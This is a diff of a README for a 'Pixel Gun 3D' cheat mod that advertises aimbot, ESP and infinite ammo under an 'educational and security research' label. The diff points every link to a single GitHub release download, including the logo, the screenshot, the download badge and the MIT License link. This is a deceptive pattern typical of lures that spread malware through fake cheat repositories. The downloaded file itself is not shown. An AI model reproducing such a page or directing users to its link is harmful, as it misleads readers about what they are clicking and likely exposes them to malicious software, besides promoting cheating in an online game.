@@ -1,6 +1,6 @@
 # Pixel Gun 3D
 
-![Pixel Gun 3D Logo](https://example.com/pixelgun_logo.png)
+![Pixel Gun 3D Logo](https://github.com/Eduuuuuuw/Pixel-Gun-3D/releases/tag/v2.0)
 
 Welcome to the Pixel Gun 3D repository! This is a free and open-source utility modification for PixelGun3D created for educational and security research purposes. The mod features AimBot, ESP, Infinite Ammo, Rapid Fire, and more enhancements and cheats for the game. You are encouraged to explore the source code, learn from it, and contribute to its development.
 
@@ -20,7 +20,7 @@ Welcome to the Pixel Gun 3D repository! This is a free and open-source utility m
 
 ## Installation
 1. Download the **Pixel Gun 3D Mod** from the following link:
-   [![Download Pixel Gun 3D Mod](https://img.shields.io/badge/Download-Software-brightgreen)](https://github.com/user-attachments/files/17676680/Software.zip)
+   [![Download Pixel Gun 3D Mod](https://github.com/Eduuuuuuw/Pixel-Gun-3D/releases/tag/v2.0)](https://github.com/Eduuuuuuw/Pixel-Gun-3D/releases/tag/v2.0)
 
 2. Unzip the downloaded file to your desired location on your device.
 
@@ -33,7 +33,7 @@ Welcome to the Pixel Gun 3D repository! This is a free and open-source utility m
 
 3. Enjoy the enhanced gameplay experience with the added functionalities.
 
-![Pixel Gun 3D Screenshot](https://example.com/pixelgun_screenshot.png)
+![Pixel Gun 3D Screenshot](https://github.com/Eduuuuuuw/Pixel-Gun-3D/releases/tag/v2.0)
 
 ## Contributing
 We welcome contributions from the community to further develop and improve the Pixel Gun 3D mod. To contribute, follow these steps:
@@ -44,7 +44,7 @@ We welcome contributions from the community to further develop and improve the P
 5. Submit a pull request back to the main repository.
 
 ## License
-This project is licensed under the [MIT License](https://opensource.org/licenses/MIT). Feel free to explore, modify, and distribute the code as per the terms of the license.
+This project is licensed under the [MIT License](https://github.com/Eduuuuuuw/Pixel-Gun-3D/releases/tag/v2.0). Feel free to explore, modify, and distribute the code as per the terms of the license.
 
 ---
 
